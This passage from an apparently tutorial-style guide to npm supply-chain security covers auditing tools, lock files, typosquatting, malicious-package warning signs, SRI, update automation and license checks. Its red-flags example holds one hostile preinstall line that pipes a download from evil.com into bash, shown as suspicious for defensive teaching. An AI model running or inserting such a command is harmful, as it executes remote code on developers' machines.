3. Dependency Auditing

# npm audit — built-in vulnerability scanner
npm audit
npm audit --production  # Only production dependencies
npm audit fix           # Auto-fix where possible
npm audit fix --force   # Force major version updates (risky)

# pnpm audit
pnpm audit
pnpm audit --production

# Snyk — more comprehensive scanning
npx snyk test
npx snyk monitor  # Continuous monitoring

# Socket — detects supply chain risks beyond CVEs
# Analyzes: install scripts, network access, filesystem access,
# environment variable access, obfuscated code, typosquatting
npx socket scan

# GitHub Dependabot alerts
# Automatically enabled for public repos
# Configure in .github/dependabot.yml
// CI integration: fail build on vulnerabilities
// .github/workflows/security.yml
name: Security Audit
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v2
      - run: pnpm install --frozen-lockfile
      - run: pnpm audit --audit-level=high
      # Fail on high/critical vulnerabilities

  snyk:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

4. Lock Files and Integrity Hashes

// Lock files pin exact dependency versions and include integrity hashes

// package-lock.json (npm)
{
  "packages": {
    "node_modules/react": {
      "version": "18.3.1",
      "resolved": "https://registry.npmjs.org/react/-/react-18.3.1.tgz",
      "integrity": "sha512-wS+hAgJShR0KhEvPJArfuPVN1+Hz1t0Y6n5jLrGQbkb4urgPE/0Rve+1kMB1v/oWgHgm4WIcV+i7F2pTVj+2A=="
    }
  }
}

// pnpm-lock.yaml
packages:
  react@18.3.1:
    resolution:
      integrity: sha512-wS+hAgJShR0KhEvPJArfuPVN1+...
    engines: {node: '>=0.10.0'}

// ALWAYS commit lock files to version control
// ALWAYS use --frozen-lockfile in CI:
npm ci                    # npm: install from lock file exactly
pnpm install --frozen-lockfile  # pnpm: fail if lock file is outdated
yarn install --immutable  # yarn: fail if lock file is outdated

// Integrity hashes ensure packages haven't been tampered with
// If the hash doesn't match, installation fails

Lock File Security

Lock files are a critical security boundary: they ensure every developer and CI environment installs the exact same dependency versions with verified integrity. Without lock files, npm install resolves version ranges and could pull in a newly published malicious version. Always: (1) commit lock files, (2) use --frozen-lockfile in CI, (3) review lock file changes in PRs (large lock file diffs may indicate dependency confusion attacks).

5. Typosquatting

// Typosquatting: publishing packages with names similar to popular ones

// Real packages vs typosquat examples:
// lodash        → lodas, lodashs, l0dash
// express       → expres, expresss, exppress
// react-router  → react-ruter, reactrouter
// cross-env     → crossenv (actual attack in 2017)

// Defense strategies:
// 1. Copy-paste package names from official docs
// 2. Verify package on npmjs.com before installing
// 3. Check download counts (typosquats have low downloads)
// 4. Use Socket or npm audit for typosquatting detection
// 5. Use an allowlist in CI

// .npmrc — restrict allowed registries
registry=https://registry.npmjs.org/
@myorg:registry=https://npm.myorg.com/

// Dependency confusion defense:
// Register your internal package names on the public registry
// as empty placeholder packages, or use scoped packages (@myorg/*)
// which can't be confused with public packages

6. Malicious Packages: Detection Signals

// Red flags in package.json:
{
  "scripts": {
    "preinstall": "curl https://evil.com/payload | bash",  // Suspicious!
    "postinstall": "node ./setup.js",  // Inspect setup.js carefully
    "install": "node-gyp rebuild"      // Native addons — review source
  }
}

// Red flags to watch for:
// 1. Install scripts that download/execute external code
// 2. Obfuscated code (eval, Buffer.from, atob chains)
// 3. Network requests in unexpected packages
// 4. Environment variable exfiltration
// 5. Filesystem access outside node_modules
// 6. Very new package with high download count (manipulation)
// 7. Single-maintainer packages with no GitHub repo

// Disable install scripts for untrusted packages:
// .npmrc
ignore-scripts=true

// Then explicitly allow trusted scripts:
// package.json
{
  "trustedDependencies": ["esbuild", "sharp", "bcrypt"]
}

// Or use pnpm's onlyBuiltDependencies:
// .npmrc (pnpm)
onlyBuiltDependencies=esbuild,sharp

7. Subresource Integrity (SRI)

// SRI ensures external scripts/styles haven't been tampered with
// The browser verifies the hash before executing

<!-- CDN-loaded script with SRI -->
<script
  src="https://cdn.jsdelivr.net/npm/react@18.3.1/umd/react.production.min.js"
  integrity="sha384-abc123def456..."
  crossorigin="anonymous"
></script>

<!-- CDN-loaded stylesheet with SRI -->
<link
  rel="stylesheet"
  href="https://cdn.example.com/styles.css"
  integrity="sha384-xyz789..."
  crossorigin="anonymous"
/>

<!-- Generate SRI hash -->
<!-- openssl dgst -sha384 -binary react.min.js | openssl base64 -A -->

// Webpack SRI plugin
const SriPlugin = require('webpack-subresource-integrity');

module.exports = {
  output: {
    crossOriginLoading: 'anonymous',
  },
  plugins: [
    new SriPlugin({
      hashFuncNames: ['sha384'],
      enabled: process.env.NODE_ENV === 'production',
    }),
  ],
};

// Vite: use vite-plugin-sri
import sri from 'vite-plugin-sri';
export default defineConfig({
  plugins: [sri()],
});

  "extends": ["config:recommended"],
  "packageRules": [
    {
      "matchUpdateTypes": ["patch"],
      "automerge": true,
      "automergeType": "branch"
    },
    {
      "matchUpdateTypes": ["minor"],
      "automerge": true,
      "automergeType": "pr",
      "requiredStatusChecks": ["ci"]
    },
    {
      "matchUpdateTypes": ["major"],
      "automerge": false,
      "labels": ["major-update"]
    },
    {
      "matchPackageNames": ["react", "react-dom"],
      "groupName": "react",
      "automerge": false
    }
  ],
  "vulnerabilityAlerts": {
    "enabled": true,
    "labels": ["security"]
  },
  "schedule": ["before 6am on Monday"]
}

// Dependabot configuration
// .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    labels:
      - "dependencies"
    ignore:
      - dependency-name: "@types/*"
        update-types: ["version-update:semver-patch"]

Architect Insight: Dependency Update Strategy

For a large React project: (1) Auto-merge patch updates (bug fixes, security patches) after CI passes, (2) Auto-merge minor updates with PR review for key dependencies, (3) Manual review for major updates (breaking changes), (4) Group related packages (react + react-dom) to update together, (5) Run security updates immediately (don't wait for the weekly schedule), (6) Maintain a dependency update SLA: security patches within 24 hours, regular updates within 1 week. Use Renovate over Dependabot for its superior grouping, scheduling, and automerge capabilities.

9. License Compliance

# Check licenses of all dependencies
npx license-checker --summary
npx license-checker --failOn "GPL-3.0;AGPL-3.0"

# Common license categories:
# Permissive (safe for commercial use):
#   MIT, Apache-2.0, BSD-2-Clause, BSD-3-Clause, ISC
#
# Copyleft (may require source disclosure):
#   GPL-2.0, GPL-3.0 — derivative works must be GPL
#   LGPL-2.1, LGPL-3.0 — linking is OK, modifications must be LGPL
#   AGPL-3.0 — network use counts as distribution
#
# Problematic:
#   SSPL — Server Side Public License (MongoDB)
#   BSL — Business Source License (time-delayed open source)
#   Unlicensed — no license = all rights reserved
// CI license check
// .github/workflows/licenses.yml
name: License Check
on: [pull_request]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm install
      - run: npx license-checker --failOn "GPL-3.0;AGPL-3.0;SSPL-1.0"

// package.json — document your license policy
{
  "license": "MIT",
  "config": {
    "allowedLicenses": [
      "MIT", "Apache-2.0", "BSD-2-Clause", "BSD-3-Clause", "ISC", "0BSD"
    ]
  }
}

10. Vendoring Dependencies

// Vendoring: copying dependency source into your repo
// Eliminates registry dependency but increases maintenance burden

// When to vendor:
// 1. Critical security-sensitive dependencies
// 2. Dependencies that are no longer maintained
// 3. Air-gapped environments without registry access
// 4. When you need to patch a dependency

// pnpm supports patching without vendoring:
// pnpm patch react-query
// (opens the package in an editor)
// (make your changes)
// pnpm patch-commit /tmp/patch-dir

// package.json
{
  "pnpm": {
    "patchedDependencies": {
      "react-query@3.39.0": "patches/react-query@3.39.0.patch"
    }
  }
}

// npm overrides (force specific versions)
{
  "overrides": {
    "vulnerable-package": "2.0.1",
    "deep-dependency": {
      "sub-dependency": "1.5.0"
    }
  }
}

// pnpm overrides
{
  "pnpm": {
    "overrides": {
      "vulnerable-package": "2.0.1"
    }
  }
}
